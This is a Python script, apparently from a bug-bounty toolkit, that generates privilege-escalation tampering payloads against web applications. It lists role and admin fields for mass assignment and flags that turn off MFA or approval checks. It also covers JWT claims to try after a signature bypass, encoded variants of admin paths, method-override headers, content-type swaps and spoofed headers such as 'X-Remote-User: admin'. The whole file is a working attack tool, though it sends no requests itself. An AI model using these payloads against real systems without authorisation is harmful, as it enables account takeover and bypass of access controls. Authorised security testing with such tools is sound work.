#!/usr/bin/env python3
"""Generate privilege-escalation tampering payloads (offline).

Usage:
  priv_mutator.py [--json '{"name":"x"}'] [--path /admin/users] [--roles admin,owner,superadmin]

Families (TSV: family  value):
  role-field     JSON bodies with one privilege-bearing field added (PE-03/07/08/09)
  role-form      the same as form-encoded strings
  flag-field     feature / plan / entitlement / debug fields (PE-10/22/35/37)
  jwt-claim      claim name=value pairs to try after any JWT signature bypass (PE-04)
  path           encoded / normalised variants of an admin path (PE-16)
  method         method-override headers and _method parameters (PE-18)
  content-type   the JSON body re-expressed in other content types (PE-19)
  header         identity / role / debug headers trusted by gateways (PE-17/26/35)
"""
import argparse
import json
import sys
from urllib.parse import quote, urlencode

ROLE_FIELDS = ["role", "roles", "role_id", "roleid", "roleId", "user_role", "userRole", "type", "user_type",
               "userType", "account_type", "accountType", "isAdmin", "is_admin", "admin", "isSuperAdmin",
               "is_superuser", "superuser", "is_staff", "staff", "access_level", "accessLevel", "level",
               "privilege", "privileges", "permissions", "perms", "scope", "scopes", "groups", "group",
               "group_id", "groups_ids", "authorities", "acl", "membership", "org_role", "team_role", "owner"]
FLAG_FIELDS = {"plan": "enterprise", "tier": "enterprise", "subscription": "pro", "is_premium": True, "premium": True,
               "trial": False, "features": ["*"], "feature_flags": {"admin_panel": True}, "beta": True,
               "internal": True, "debug": True, "test": True, "verified": True, "email_verified": True,
               "approved": True, "status": "approved", "skip_approval": True, "seats": 9999,
               "sso_enforced": False, "mfa_required": False, "default_role": "admin", "allow_member_invites": True}
JWT_CLAIMS = ["role=admin", "roles=[\"admin\"]", "scope=admin", "scope=openid profile email admin", "scp=[\"admin\"]",
              "groups=[\"admin\"]", "permissions=[\"*\"]", "isAdmin=true", "admin=true", "is_staff=true",
              "tid=<other tenant id>", "org_id=<other org id>", "sub=<your other account id>", "aud=<admin api>",
              "acr=urn:mfa", "amr=[\"pwd\",\"mfa\"]"]
HEADERS = ["X-User-Role: admin", "X-Role: admin", "X-Roles: admin", "X-User-Roles: admin", "X-Admin: true",
           "X-Is-Admin: true", "X-Authenticated-Userid: admin", "X-Consumer-Groups: admin", "X-Forwarded-User: admin",
           "X-Remote-User: admin", "X-Auth-Request-Groups: admin", "X-Internal: true", "X-Debug: 1", "X-Staff: 1",
           "X-Env: staging", "X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1", "X-Originating-IP: 127.0.0.1",
           "X-Custom-IP-Authorization: 127.0.0.1", "CF-IPCountry: US", "X-Country-Code: US"]


def role_values(name, roles):
    plural = name in ("roles", "permissions", "perms", "privileges", "groups", "authorities", "scopes", "groups_ids")
    out = []
    for r in roles:
        if name.lower().startswith("is") or name in ("admin", "superuser", "staff", "owner"):
            out.append(True)
            break
        if name.endswith("_id") or name.endswith("Id") or name in ("roleid", "level", "access_level", "accessLevel"):
            out += [0, 1, 2, 99]
            break
        if name == "membership":
            out.append({"role": r})
            continue
        out.append([r] if plural else r)
    if plural:
        out.append(["*"])
    return out


def path_variants(p):
    p = "/" + p.strip("/")
    segs = p.strip("/").split("/")
    first, rest = segs[0], "/".join(segs[1:])
    tail = "/" + rest if rest else ""
    enc_first = "".join(f"%{ord(c):02x}" for c in first)
    v = [p.upper(), p.capitalize(), "/" + first[0].upper() + first[1:] + tail,
         "/" + quote(first[0], safe="").replace(first[0], f"%{ord(first[0]):02x}") + first[1:] + tail,
         "/" + enc_first + tail, "/" + "".join(f"%25{ord(c):02x}" for c in first) + tail,
         p + "/", p + "%2f", p + "/.", p + ";", p + ";/", p + "..;/", "/" + first + "..;/" + rest,
         "/" + p, "/./" + p.lstrip("/"), "/x/.." + p, "/%2e" + p, p + "%00", p + "%20", p + "%09", p + "#", p + "?",
         p + ".json", p + ".html", "/" + "".join(chr(ord(c) + 0xFEE0) if "a" <= c <= "z" else c for c in first) + tail,
         "/api" + p, "/v1" + p, p.replace("/", "//")]
    seen, out = set(), []
    for x in v:
        if x != p and x not in seen:
            seen.add(x)
            out.append(x)
    return out


def content_types(body):
    try:
        obj = json.loads(body)
    except ValueError:
        sys.exit("--json must be valid JSON")
    flat = {k: (json.dumps(v) if isinstance(v, (dict, list)) else v) for k, v in obj.items()}
    form = urlencode(flat)
    xml = "<root>" + "".join(f"<{k}>{v}</{k}>" for k, v in flat.items()) + "</root>"
    multipart = "".join(f'--BB\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n' for k, v in flat.items()) + "--BB--"
    dup = body.rstrip("}") + (", " if obj else "") + ", ".join(f'"{k}":{json.dumps(v)}' for k, v in obj.items()) + "}"
    return [("application/x-www-form-urlencoded", form), ("multipart/form-data; boundary=BB", multipart.replace("\r\n", "\\r\\n")),
            ("text/plain", body), ("application/xml", xml), ("application/json;charset=UTF-8 (duplicate keys)", dup),
            ("application/vnd.api+json", body), ("application/merge-patch+json", body)]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--json", default='{"name":"bbtest"}', help="base JSON body of the request you are tampering")
    ap.add_argument("--path", default="/admin")
    ap.add_argument("--roles", default="admin,owner,superadmin,administrator,root,staff")
    a = ap.parse_args()
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    roles = [r.strip() for r in a.roles.split(",") if r.strip()]
    try:
        base = json.loads(a.json)
    except ValueError:
        sys.exit("--json must be valid JSON")

    rows = []
    for f in ROLE_FIELDS:
        for val in role_values(f, roles):
            body = dict(base)
            body[f] = val
            rows.append(("role-field", json.dumps(body)))
            flat = {k: (json.dumps(v) if isinstance(v, (dict, list)) else v) for k, v in body.items()}
            rows.append(("role-form", urlencode(flat)))
    for f, val in FLAG_FIELDS.items():
        body = dict(base)
        body[f] = val
        rows.append(("flag-field", json.dumps(body)))
    rows += [("jwt-claim", c) for c in JWT_CLAIMS]
    rows += [("path", p) for p in path_variants(a.path)]
    rows += [("method", m) for m in ("X-HTTP-Method-Override: PUT", "X-HTTP-Method-Override: PATCH",
                                     "X-HTTP-Method-Override: GET", "X-HTTP-Method: PUT", "X-Method-Override: PUT",
                                     "_method=PUT (body or query)", "_method=PATCH (body or query)",
                                     "POST->GET with body params moved to query", "HEAD", "OPTIONS")]
    rows += [("content-type", f"{ct}\t{b}") for ct, b in content_types(json.dumps({**base, "role": roles[0]}))]
    rows += [("header", h) for h in HEADERS]

    print("family\tvalue")
    seen = set()
    for fam, val in rows:
        if (fam, val) in seen:
            continue
        seen.add((fam, val))
        print(f"{fam}\t{val}")


if __name__ == "__main__":
    main()
